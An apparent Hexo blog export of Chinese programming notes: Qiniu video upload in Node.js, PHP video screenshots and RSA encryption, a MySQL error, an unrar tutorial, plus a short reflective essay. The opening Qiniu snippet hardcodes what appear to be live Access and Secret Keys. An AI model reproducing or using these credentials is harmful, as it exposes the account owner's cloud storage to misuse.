<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var qiniu = require("qiniu");</span><br><span class="line"><span class="comment">//要上传的空间</span></span><br><span class="line">bucket = '1v1';</span><br><span class="line"><span class="comment">//需要填写你的 Access Key 和 Secret Key</span></span><br><span class="line">var accessKey = 'qKJM7ruEYGhN6q3eoEUD3Ep6RfaPr-esV6Bxdzer';</span><br><span class="line">var secretKey = 'iiBt1mGKOP5A8yYoaiWJ0MbKCoZVaUuAxsn-8KDf';</span><br><span class="line"></span><br><span class="line">var date = new Date();;</span><br><span class="line">var upload_file = date.getFullYear() + '-' + date.getMonth() + '-' + date.getDate() + '/' +date.getHours() + '-' + date.getMinutes() + '-' + date.getSeconds() + '.mp4';</span><br><span class="line"></span><br><span class="line"><span class="comment">//转码是使用的队列名称。</span></span><br><span class="line">var pipeline = '1v1queue'; //设定自己账号下的pipleline</span><br><span class="line"><span class="comment">//要进行转码的转码操作。</span></span><br><span class="line">fops = "avthumb/mp4/s/640x360/vb/1.25m"</span><br><span class="line"><span class="comment">//可以对转码后的文件进行使用saveas参数自定义命名，当然也可以不指定文件会默认命名并保存在当间。</span></span><br><span class="line">saveas_key = qiniu.util.urlsafeBase64Encode(bucket+':'+upload_file);</span><br><span class="line">fops = fops+'|saveas/'+saveas_key;;</span><br><span class="line"></span><br><span class="line">var mac = new qiniu.auth.digest.Mac(accessKey, secretKey);</span><br><span class="line">var options = &#123;</span><br><span class="line">scope: bucket,</span><br><span class="line">&#125;</span><br><span class="line">var putPolicy = new qiniu.rs.PutPolicy(options);</span><br><span class="line">putPolicy.persistentOps = fops;</span><br><span class="line">putPolicy.persistentPipeline = pipeline;</span><br><span class="line">var uploadToken = putPolicy.uploadToken(mac);</span><br><span class="line"></span><br><span class="line">var config = new qiniu.conf.Config();</span><br><span class="line">config.useCdnDomain = true;</span><br><span class="line">var localFile =  './test.mp4';</span><br><span class="line"><span class="comment">//config.zone = qiniu.zone.Zone_z0;</span></span><br><span class="line"></span><br><span class="line">var formUploader = new qiniu.form_up.FormUploader(config);</span><br><span class="line">var putExtra = new qiniu.form_up.PutExtra();</span><br><span class="line"></span><br><span class="line">formUploader.putFile(uploadToken, upload_file, localFile, putExtra, function(respErr, respBody, respInfo) &#123;</span><br><span class="line">    if (respErr) &#123;</span><br><span class="line">        throw respErr;</span><br><span class="line">    &#125;</span><br><span class="line">    if (respInfo.statusCode == 200) &#123;</span><br><span class="line">        console.log(respBody);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.log(respInfo.statusCode);</span><br><span class="line">        console.log(respBody);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a><code>package.json</code></h4><p><code></code> json<br>{<br>    “dependencies”: {<br>        “qiniu”: “^7.2.2”<br>    }<br>}</p>
<p><code></code></p>
]]></content>
      <tags>
        <tag>七牛云</tag>
      </tags>
  </entry>
  <entry>
    <title>【笔录】偶悟笔录</title>
    <url>/2019/10/21/%E3%80%90%E7%AC%94%E5%BD%95%E3%80%91%E5%81%B6%E6%82%9F%E7%AC%94%E5%BD%95/</url>
    <content><![CDATA[<h3 id="【2019-10-21】我在意人的眼光人的想法，那TA是否就限制了我？"><a href="#【2019-10-21】我在意人的眼光人的想法，那TA是否就限制了我？" class="headerlink" title="【2019-10-21】我在意人的眼光人的想法，那TA是否就限制了我？"></a>【2019-10-21】我在意人的眼光人的想法，那<code>TA</code>是否就限制了我？</h3><p>&emsp;别人对我爱理不理，我恼怒，对于那些非善意的眼光或者失礼的眼光我是在意的，基于我自身的处世原则来评判<code>TA</code>的行为。从而有种超越想<code>TA</code>证明自己不比<code>TA</code>差比<code>TA</code>强，来证明<code>TA</code>的评估行为的错误的。<br>&emsp;基于这个基础上，结果会有2种结果，一种是<code>TA</code>比我优秀而我有进步的空间， 一种是确实比<code>TA</code>优秀，然后就没有然后， 除非遇到下一个<code>TA</code>。结论是：人的想法会限制住自己。那要是我不大意别人的想法别人的看法， 我还会被限制住吗?会！有一个人的想法是是谁也无法逃避了的，就是自己。<br>&emsp; 再基于以上的基础上，就算自己不在意外人的看法不在意别人的想法的这个想法，我赢了，不再受<code>TA</code>人的想法干扰也就不再受他人限制。而这本身就是自己的想法，本身就被自己的想法限制住了。这时能取得多大的进步空间，取决于这个想法有多大，也就是梦想。果然，人最终的敌人还是自己。</p>
<h3 id="【2019-10-21】是找答案好还是创造答案好？"><a href="#【2019-10-21】是找答案好还是创造答案好？" class="headerlink" title="【2019-10-21】是找答案好还是创造答案好？"></a>【2019-10-21】是找答案好还是创造答案好？</h3><p>&emsp; 如题，你要是回答了这个问题，那么你的回答很可能是”好”或”不好”，或者其它的如：好也不好， 不好也好，可能好也可能不好…。不管这个答案是怎么样的，一旦回答了，也就被限制住了。如果非要 找一个条，创造答案本身就很难说，为一个问题创造答案本身就被问题给限制住在里面了，但只要这个答案没有被确定，又好像没有被限制住，因为在创造前它根据就不存在。所以创造答案会更好，它或许有意料不来的效果。<br><a id="more"></a></p>
]]></content>
      <categories>
        <category>心情文章</category>
      </categories>
      <tags>
        <tag>语录</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】php笔记-视频截图</title>
    <url>/2019/10/19/%E3%80%90php%E3%80%91php%E7%AC%94%E8%AE%B0-%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE/</url>
    <content><![CDATA[<h3 id="开篇明义"><a href="#开篇明义" class="headerlink" title="开篇明义"></a>开篇明义</h3><p>  &emsp; 遇到一个有视频文件截图的需求，于是搜索了下用<code>php</code>来处理视频文件截图的案例，还真有！大概的处理方式是使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUC1GRk1wZWcvUEhQLUZGTXBlZw==" title="https://github.com/PHP-FFMpeg/PHP-FFMpeg">PHP-FFMpeg/PHP-FFMpeg<i class="fa fa-external-link"></i></span>库来实现的，而<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUC1GRk1wZWcvUEhQLUZGTXBlZw==" title="https://github.com/PHP-FFMpeg/PHP-FFMpeg">PHP-FFMpeg/PHP-FFMpeg<i class="fa fa-external-link"></i></span>又通过命令行来调用系统的<code>FFMpeg</code>视频处理程序并把视频文件传进去进行截图并保存。从而实现视频的截图。</p>
<h3 id="系统环境参数"><a href="#系统环境参数" class="headerlink" title="系统环境参数"></a>系统环境参数</h3><div class="note info">
            <p><code>OS</code>:<code>centos 7.6</code><br><code>php-version</code>: <code>7.2</code></p>
          </div>
<a id="more"></a>
<h3 id="安装FFMpeg"><a href="#安装FFMpeg" class="headerlink" title="安装FFMpeg"></a>安装<code>FFMpeg</code></h3><p>&emsp;最终的视频文件是由安装在系统上的、<code>php</code>外部的应用程序的<code>FFMpeg</code>来处理，需要先安装这个程序。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由于系统内置源没有FFMpeg 需要引入外部来的源才能安装</span></span><br><span class="line">rpm --import http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro</span><br><span class="line">rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm</span><br><span class="line"><span class="comment">#安装FFmpeg 和 FFmpeg开发包</span></span><br><span class="line">yum install ffmpeg ffmpeg-devel -y</span><br><span class="line"><span class="comment"># 查看是否安装成功输入下面的可以看看有没有打印相关版本的信息来查看</span></span><br><span class="line">ffmpeg</span><br></pre></td></tr></table></figure></div></p>
<h3 id="php安装FFMpeg扩展包"><a href="#php安装FFMpeg扩展包" class="headerlink" title="php安装FFMpeg扩展包"></a><code>php</code>安装<code>FFMpeg</code>扩展包</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">composer require php-ffmpeg/php-ffmpeg</span><br></pre></td></tr></table></figure></div>
<h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$ffmpeg = \FFMpeg\FFMpeg::create(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'ffmpeg.binaries'</span>  =&gt; <span class="string">'/usr/bin/ffmpeg'</span>, <span class="comment">// 这里是告诉php 系统内的FFMpeg的启动文件在哪里</span></span><br><span class="line">    <span class="string">'ffprobe.binaries'</span> =&gt; <span class="string">'/usr/bin/ffprobe'</span>,</span><br><span class="line">    <span class="string">'timeout'</span>          =&gt; <span class="number">0</span>, <span class="comment">// The timeout for the underlying process</span></span><br><span class="line">    <span class="string">'ffmpeg.threads'</span>   =&gt; <span class="number">12</span>, <span class="comment">// The number of threads that FFMpeg should use</span></span><br><span class="line">    ), @$logger);</span><br><span class="line">$video     = $ffmpeg-&gt;open(<span class="string">'./test.mp4'</span>);</span><br><span class="line"><span class="comment">// 保存截图的文件</span></span><br><span class="line">$microtime = (explode(<span class="string">'.'</span>, microtime(<span class="keyword">true</span>)))[<span class="number">1</span>];</span><br><span class="line">$save_name = <span class="string">'./frame_'</span>. date(<span class="string">"Y-m-d-H-i-s"</span>, time()) .<span class="string">"-&#123;$microtime&#125;"</span>.<span class="string">'.jpg'</span>;</span><br><span class="line">$result    = $video -&gt;frame(\FFMpeg\Coordinate\TimeCode::fromSeconds(<span class="number">1</span>)) <span class="comment">// 截图视频1秒位置的图片</span></span><br><span class="line">    -&gt;save($save_name);</span><br></pre></td></tr></table></figure></div>
<p>运行完成后会在本地生成一个<code>jpg</code>格式的图片</p>
]]></content>
      <tags>
        <tag>视频截图</tag>
      </tags>
  </entry>
  <entry>
    <title>【shell】.bashrc配置文件</title>
    <url>/2019/10/14/%E3%80%90shell%E3%80%91gitbash%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> editor=vim</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>【mysql】myqsl笔记-FQA记录</title>
    <url>/2019/10/10/%E3%80%90mysql%E3%80%91myqsl%E7%AC%94%E8%AE%B0-FQA%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h4 id="1-The-user-specified-as-a-definer-‘xxx‘-’-’-does-not-exist-when"><a href="#1-The-user-specified-as-a-definer-‘xxx‘-’-’-does-not-exist-when" class="headerlink" title="1 The user specified as a definer (‘xxx‘@’%’) does not exist when"></a>1 The user specified as a definer (‘xxx‘@’%’) does not exist when</h4><div class="note success">
            <p>当从另一台服务器的迁移一个库过来时并将数据库导入到另的用户(跟迁移过来的数据库的原来的用户名不同), 且原来的数据库的用户名并没有重新创建会报这个错误， 错误提示是原来数据库创建的<code>view</code> 当前的数据库找不到这个用户。 可以创建原来数据库的账户并把数据库的权限给TA。数据库授权参考<a href="/2018/06/10/【mySQL】mySQL学习笔记-基本常识/">《【mySQL】mySQL学习笔记-基本常识》</a></p>
          </div>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql_fqa</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】php笔记-RSA加密解密(转)</title>
    <url>/2019/10/09/%E3%80%90php%E3%80%91php%E7%AC%94%E8%AE%B0-RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rsa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $privateKey = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $publicKey = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $resource = openssl_pkey_new();</span><br><span class="line">        openssl_pkey_export($resource, <span class="keyword">$this</span>-&gt;privateKey);</span><br><span class="line">        $detail = openssl_pkey_get_details($resource);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;publicKey = $detail[<span class="string">'key'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">publicEncrypt</span><span class="params">($data, $publicKey)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        openssl_public_encrypt($data, $encrypted, $publicKey);</span><br><span class="line">        <span class="keyword">return</span> $encrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">publicDecrypt</span><span class="params">($data, $publicKey)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        openssl_public_decrypt($data, $decrypted, $publicKey);</span><br><span class="line">        <span class="keyword">return</span> $decrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">privateEncrypt</span><span class="params">($data, $privateKey)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        openssl_private_encrypt($data, $encrypted, $privateKey);</span><br><span class="line">        <span class="keyword">return</span> $encrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">privateDecrypt</span><span class="params">($data, $privateKey)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        openssl_private_decrypt($data, $decrypted, $privateKey);</span><br><span class="line">        <span class="keyword">return</span> $decrypted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$rsa = <span class="keyword">new</span> Rsa();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"公钥：\n"</span>, $rsa-&gt;publicKey, <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"私钥：\n"</span>, $rsa-&gt;privateKey, <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用公钥加密</span></span><br><span class="line">$str = $rsa-&gt;publicEncrypt(<span class="string">'hello'</span>, $rsa-&gt;publicKey);</span><br><span class="line"><span class="comment">// 这里使用base64是为了不出现乱码，默认加密出来的值有乱码</span></span><br><span class="line">$str = base64_encode($str);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"公钥加密（base64处理过）：\n"</span>, $str, <span class="string">"\n"</span>;</span><br><span class="line">$str = base64_decode($str);</span><br><span class="line">$pubstr = $rsa-&gt;publicDecrypt($str, $rsa-&gt;publicKey);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"公钥解密：\n"</span>, $pubstr, <span class="string">"\n"</span>;</span><br><span class="line">$privstr = $rsa-&gt;privateDecrypt($str, $rsa-&gt;privateKey);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"私钥解密：\n"</span>, $privstr, <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用私钥加密</span></span><br><span class="line">$str = $rsa-&gt;privateEncrypt(<span class="string">'world'</span>, $rsa-&gt;privateKey);</span><br><span class="line"><span class="comment">// 这里使用base64是为了不出现乱码，默认加密出来的值有乱码</span></span><br><span class="line">$str = base64_encode($str);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"私钥加密（base64处理过）：\n"</span>, $str, <span class="string">"\n"</span>;</span><br><span class="line">$str = base64_decode($str);</span><br><span class="line">$pubstr = $rsa-&gt;publicDecrypt($str, $rsa-&gt;publicKey);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"公钥解密：\n"</span>, $pubstr, <span class="string">"\n"</span>;</span><br><span class="line">$privstr = $rsa-&gt;privateDecrypt($str, $rsa-&gt;privateKey);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"私钥解密：\n"</span>, $privstr, <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FuZGVhL3AvNDc0MzE0Mi5odG1s" title="https://www.cnblogs.com/sandea/p/4743142.html">源码来源<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】linux笔记-linux如何解压打开rar文件(转)</title>
    <url>/2019/10/05/%E3%80%90linux%E3%80%91linux%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80rar%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="How-to-Open-Extract-and-Create-RAR-Files-in-Linux"><a href="#How-to-Open-Extract-and-Create-RAR-Files-in-Linux" class="headerlink" title="How to Open, Extract and Create RAR Files in Linux"></a>How to Open, Extract and Create RAR Files in Linux</h3><p>&emsp; RAR is a most popular tool for creating and extracting compressed archive (.rar) files. When we download an archive file from the web, we required a rar tool to extract them.<br>&emsp; RAR is available freely under Windows operating systems to handle compressed files, but unfortunately, rar tool doesn’t pre-installed under Linux systems.<br>&emsp; This article explains how to install unrar and rar command-line tools using official binary tar file under Linux systems to open, extract, uncompress or unrar an archive file.</p>
<h2 id="Step-1-How-to-Install-Unrar-in-Linux"><a href="#Step-1-How-to-Install-Unrar-in-Linux" class="headerlink" title="Step 1: How to Install Unrar in Linux"></a>Step 1: How to Install Unrar in Linux</h2><p>On Debian and Ubuntu based distributions, you can easily install unrar package using the apt-get or apt program as shown.<br><a id="more"></a><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install unrar</span><br><span class="line">Or</span><br><span class="line">$ sudo apt install unrar</span><br></pre></td></tr></table></figure></div></p>
<p>&emsp;If you are using Fedora distribution, you can use the dnf command to install it.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ sudp dnf install unrar</span><br></pre></td></tr></table></figure></div>
<p>&emsp;iIf you are using a CentOS / RHEL distribution, you need to download the latest unrar/rar file and install it using following commands.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">--------------- On 64-bit --------------- </span><br><span class="line"><span class="comment"># cd /tmp</span></span><br><span class="line"><span class="comment"># wget https://www.rarlab.com/rar/rarlinux-x64-5.6.0.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxvf rarlinux-x64-5.6.0.tar.gz</span></span><br><span class="line"><span class="comment"># cd rar</span></span><br><span class="line"><span class="comment"># sudo cp -v rar unrar /usr/local/bin/</span></span><br><span class="line"></span><br><span class="line">--------------- On 32-bit --------------- </span><br><span class="line"><span class="comment"># cd /tmp</span></span><br><span class="line"><span class="comment"># wget https://www.rarlab.com/rar/rarlinux-5.6.0.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxvf rarlinux-5.6.0.tar.gz</span></span><br><span class="line"><span class="comment"># cd rar</span></span><br><span class="line"><span class="comment"># sudo cp -v rar unrar /usr/local/bin/</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Step-2-How-to-Open-Extract-a-RAR-File-in-Linux"><a href="#Step-2-How-to-Open-Extract-a-RAR-File-in-Linux" class="headerlink" title="Step 2: How to Open/Extract a RAR File in Linux"></a>Step 2: How to Open/Extract a RAR File in Linux</h2><p>&emsp; To open/extract a RAR file in current working directory, just use the following command with unrar e option.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unrar e tecmint.rar</span></span><br><span class="line"></span><br><span class="line">UNRAR 4.20 beta 3 freeware      Copyright (c) 1993-2012 Alexander Roshal</span><br><span class="line"></span><br><span class="line">Extracting from tecmint.rar</span><br><span class="line"></span><br><span class="line">Extracting  index.php                                                 OK</span><br><span class="line">Extracting  index.html                                                OK</span><br><span class="line">Extracting  xyz.txt                                                   OK</span><br><span class="line">Extracting  abc.txt                                                   OK</span><br><span class="line">All OK</span><br></pre></td></tr></table></figure></div>
<p>&emsp; To open/extract a RAR file in specific path or destination directory, just use the unrar e option, it will extract all the files in specified destination directory.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unrar e tecmint.rar /home/</span></span><br><span class="line"></span><br><span class="line">UNRAR 4.20 beta 3 freeware      Copyright (c) 1993-2012 Alexander Roshal</span><br><span class="line"></span><br><span class="line">Extracting from tecmint.rar</span><br><span class="line"></span><br><span class="line">Extracting  /home/index.php                                           OK</span><br><span class="line">Extracting  /home/index.html                                          OK</span><br><span class="line">Extracting  /home/xyz.txt                                             OK</span><br><span class="line">Extracting  /home/abc.txt                                             OK</span><br><span class="line">All OK</span><br></pre></td></tr></table></figure></div>
<p>To open/extract a RAR file with their original directory structure. just issue below command with unrar x option. It will extract according their folder structure see below output of the command.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unrar x tecmint.rar</span></span><br><span class="line"></span><br><span class="line">UNRAR 4.20 beta 3 freeware      Copyright (c) 1993-2012 Alexander Roshal</span><br><span class="line"></span><br><span class="line">Extracting from tecmint.rar</span><br><span class="line"></span><br><span class="line">Creating    tecmint                                                   OK</span><br><span class="line">Extracting  tecmint/index.php                                         OK</span><br><span class="line">Extracting  tecmint/index.html                                        OK</span><br><span class="line">Extracting  tecmint/xyz.txt                                           OK</span><br><span class="line">Extracting  tecmint/abc.txt                                           OK</span><br><span class="line">Creating    default                                                   OK</span><br><span class="line">Extracting  default/index.php                                         OK</span><br><span class="line">Extracting  default/index.html                                        OK</span><br><span class="line">Creating    include                                                   OK</span><br><span class="line">Extracting  include/abc.txt                                           OK</span><br><span class="line">Creating    php                                                       OK</span><br><span class="line">Extracting  php/xyz.txt                                               OK</span><br><span class="line">All OK</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-3-How-to-List-a-RAR-File-in-Linux"><a href="#Step-3-How-to-List-a-RAR-File-in-Linux" class="headerlink" title="Step 3: How to List a RAR File in Linux"></a>Step 3: How to List a RAR File in Linux</h2><p>To list a files inside a archive file use unrar l option. It will display the list of files with their sizes, date, time and permissions.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">unrar l tecmint.rar</span><br><span class="line"></span><br><span class="line">UNRAR 4.20 beta 3 freeware      Copyright (c) 1993-2012 Alexander Roshal</span><br><span class="line"></span><br><span class="line">Archive tecmint.rar</span><br><span class="line"></span><br><span class="line"> Name             Size   Packed Ratio  Date   Time     Attr      CRC   Meth Ver</span><br><span class="line"> -------------------------------------------------------------------------------</span><br><span class="line"> index.php           0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> index.html          0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> xyz.txt             0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> abc.txt             0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> index.php           0        8   0% 18-08-12 19:22 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> index.html          0        8   0% 18-08-12 19:22 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> abc.txt             0        8   0% 18-08-12 19:22 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> xyz.txt             0        8   0% 18-08-12 19:22 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> -------------------------------------------------------------------------------</span><br><span class="line"> 8                0       64   0%</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-4-How-to-Test-a-RAR-File-in-Linux"><a href="#Step-4-How-to-Test-a-RAR-File-in-Linux" class="headerlink" title="Step 4: How to Test a RAR File in Linux"></a>Step 4: How to Test a RAR File in Linux</h2><p>To test an integrity of a archive file, use option unrar t. The below command will perform a complete integrity check for each file and displays the status of the file.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">unrar t tecmint.rar</span><br><span class="line"></span><br><span class="line">UNRAR 4.20 beta 3 freeware      Copyright (c) 1993-2012 Alexander Roshal</span><br><span class="line"></span><br><span class="line">Testing archive tecmint.rar</span><br><span class="line"></span><br><span class="line">Testing     tecmint/index.php                                         OK</span><br><span class="line">Testing     tecmint/index.html                                        OK</span><br><span class="line">Testing     tecmint/xyz.txt                                           OK</span><br><span class="line">Testing     tecmint/abc.txt                                           OK</span><br><span class="line">Testing     default/index.php                                         OK</span><br><span class="line">Testing     default/index.html                                        OK</span><br><span class="line">Testing     include/abc.txt                                           OK</span><br><span class="line">Testing     php/xyz.txt                                               OK</span><br><span class="line">All OK</span><br></pre></td></tr></table></figure></div>
<p>The unrar command is used to extract, list or test archive files only. It has no any option for creating RAR files under Linux. So, here we need to install RAR command-line utility to create archive files.</p>
<h2 id="Step-5-How-to-Install-Rar-in-Linux"><a href="#Step-5-How-to-Install-Rar-in-Linux" class="headerlink" title="Step 5: How to Install Rar in Linux"></a>Step 5: How to Install Rar in Linux</h2><p>To install RAR command option in Linux, just execute following command.<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo apt-get install rar</span></span><br><span class="line"><span class="comment"># sudo dnf install rar</span></span><br><span class="line"><span class="comment"># yum install rar</span></span><br></pre></td></tr></table></figure></div></p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">Dependencies Resolved</span><br><span class="line">=========================================================================================</span><br><span class="line">Package            Arch            Version             Repository          Size</span><br><span class="line">=========================================================================================</span><br><span class="line">Installing:</span><br><span class="line">rar               i386            3.8.0-1.el5.rf      rpmforge            264 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">    =========================================================================================</span><br><span class="line">    Install       1 Package(s)</span><br><span class="line">Upgrade       0 Package(s)</span><br><span class="line"></span><br><span class="line">Total download size: 264 k</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">rar-3.8.0-1.el5.rf.i386.rpm                                       | 264 kB     00:01</span><br><span class="line">Running rpm_check_debug</span><br><span class="line">Running Transaction Test</span><br><span class="line">Finished Transaction Test</span><br><span class="line">Transaction Test Succeeded</span><br><span class="line">Running Transaction</span><br><span class="line">Installing     : rar                                          1/1</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">rar.i386 0:3.8.0-1.el5.rf</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-6-How-to-Create-Rar-File-in-Linux"><a href="#Step-6-How-to-Create-Rar-File-in-Linux" class="headerlink" title="Step 6: How to Create Rar File in Linux"></a>Step 6: How to Create Rar File in Linux</h2><p>To create a archive(RAR) file in Linux, run the following command with rar a option. It will create archive file for a tecmint directory.</p>
